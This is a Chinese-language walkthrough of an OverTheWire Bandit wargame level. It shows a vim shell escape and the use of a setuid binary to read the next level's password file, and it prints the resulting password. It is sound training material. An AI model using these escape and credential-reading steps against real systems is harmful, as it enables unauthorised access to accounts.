# Bandit Level 26 → 27 — vim 取得 shell + setuid

> 已經在 vim 裡了——vim 不只能看檔案，還能開 shell。

---

## 題目說明

承接 Level 25，已透過 vim 進入 bandit26 的環境。家目錄有 `bandit27-do` setuid binary。

---

## 解題步驟

在 vim 中設定 shell 為 bash：

```
:set shell=/bin/bash
```

開啟 shell：

```
:shell
```

取得 bash shell 後，使用 setuid binary 讀取密碼：

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

---

## 密碼

<details>
<summary>展開（先自己試過再看）</summary>

```
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

</details>

---

## 這關學到什麼

- vim 的 `:set shell=` 可以指定要用哪個 shell
- `:shell` 從 vim 內部開啟 shell
- setuid binary 以檔案擁有者的身份執行指令

---

<div align="center">

**◀ [Level 25 → 26：more / vim 逃逸](../level25/)** · [🏠 回 Bandit 索引](../README.md) · **[Level 27 → 28：git clone ▶](../level27/)**

</div>
